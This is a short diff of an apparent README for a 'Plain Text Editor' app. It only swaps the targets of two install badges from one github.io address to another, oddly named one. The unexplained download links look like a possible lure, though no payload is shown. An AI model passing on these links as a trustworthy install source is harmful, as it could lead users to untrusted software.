@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://somovskoye.github.io/.github/plainTextEditor)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://skalsd-oasd.github.io/.github/plainTextEditor)
 
 </div>
 
@@ -81,7 +81,7 @@ Plain Text Editor's most immediate value proposition is formatting removal — t
 
 <p align="center">
 
-[![Get it Now Plain Text Editor](https://img.shields.io/badge/Get_it_Now-3A86FF?style=for-the-badge&logo=apple&logoColor=white)](https://somovskoye.github.io/.github/plainTextEditor)
+[![Get it Now Plain Text Editor](https://img.shields.io/badge/Get_it_Now-3A86FF?style=for-the-badge&logo=apple&logoColor=white)](https://skalsd-oasd.github.io/.github/plainTextEditor)
 
 </p>
 
